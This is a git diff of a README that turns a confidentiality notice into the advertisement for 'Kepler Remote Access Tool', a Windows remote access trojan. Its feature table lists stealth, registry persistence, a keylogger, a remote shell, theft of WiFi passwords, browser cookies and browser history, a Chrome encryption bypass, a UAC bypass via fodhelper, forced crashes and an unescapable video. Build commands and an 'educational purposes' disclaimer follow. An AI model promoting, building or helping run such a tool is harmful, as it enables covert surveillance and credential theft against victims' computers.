@@ -1,25 +1,60 @@
-# ⚠️ WARNING: Confidential Code – Do Not Share
+░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░░▒▓█▓▒░      ░▒▓████████▓▒░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░▒▓████████▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░     
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░     
+░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓█▓▒░      ░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░ ░▒▓█▓▒░     
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░     
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░     
+░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░      ░▒▓████████▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░     
+                                                                                                                      
+                                                                                                                      
+                                                                                                 
+                                                                                                 
+Kepler Remote Access Tool.
 
-This repository contains **private and confidential** code. Unauthorized access, sharing, or distribution of any content within this repository is strictly prohibited.
+### Features 
 
-## 🚫 DO NOT:
-- Share this code publicly or privately.
-- Upload any part of this code to external platforms (e.g., GitHub, GitLab, Pastebin, forums, etc.).
-- Reuse this code in other projects without explicit permission.
-- Discuss the contents of this repository with unauthorized individuals.
+##### Kepler Client
+Feature | Description
+--------|-------------
+Stealth | Runs in background.
+Persistence | Installs inside System32, Start Menu and has startup persistence via Registry key.
+Upload / Download / Remove Files | Upload, download and remove files from the victim system.
+Screenshot | Take screenshot.
+Webcam Photo | Capture default camera photo.
+Keylogger | Log Keystrokes and save to file via Reflective DLL.
+Check Admin | Get Kepler Client process admin status.
+Power off | Power off the Client system.
+Reboot | Reboot the client system.
+Trigger BSOD | Trigger the iconic Blue Screen Of Death.
+Remote Shell | Access to CMD commands.
+WIFI Info | Get the used wifi infos (passwords, ip, etc).
+Manage Clipboard | Get and set clipboard text content.
+Open URL | Open any URL in the default browser.
+Advanced Cookie Extraction | Bypasses Chrome's ABE, and grabs cookies from Firefox, Edge, Brave, Chrome, and Vivaldi.
+Open Start Menu Program | Open any program if it's in Start Menu folder.
+Play Fullscreen Video | Plays any .mp4 video in the system and holds fullscreen, even if closing is tried, so it is unescapable.
+Get System Info | Get RAM, CPU, GPU, OS, Drives, MAC Adress, UUID, DNS, and hostname info.
+Get Browser History | Grabs history from Chrome, Edge, Brave and Firefox and allows you to download it.
+Show Message Box | Shows a message box with prompted text.
+Manage System Audio | Allows you to mute, unmute, set and get volume from used audio device.
+**BYPASS UAC** | Uses famous admin bypass to get admin privileges through fodhelper binary and delegate registries.
 
-## ✅ YOU MAY:
-- Use the code **only** if you have been given explicit permission.
-- Work on this code **in a secure and private environment**.
-- Report any accidental leaks or security concerns immediately.
-
-## ⚖️ Disclaimer of Liability
-The authors and maintainers of this code are **not responsible** for any misuse, abuse, or illegal activity resulting from its use.  
-**By accessing or using this code, you accept full responsibility** for any consequences that may arise.
-
-## 🔒 Legal Notice
-This code is protected by intellectual property laws and may contain sensitive or proprietary information. Unauthorized use or distribution may result in legal action.
 
 ---
 
-**If you are not the intended recipient or do not have permission to access this repository, please exit immediately and notify the owner.**
+
+### Client Executable Build Tutorial (via bat file)
+```bash
+> git clone https://github.com/1ypi/private
+> cd private
+> ./builder.bat
+```
+
+#### Developers
+This project was built by 1ypi and iznard aka. "vectxr.".
+You can contact us on Discord: @1ypi, @iznard.
+
+#### LICENSE
+[VIEW LICENSE](https://github.com/1ypi/private/blob/master/LICENSE) 
+
+The Developers are not responsible for any misuse of Damage caused by the program. This is created only for EDUCATIONAL PURPOSES.
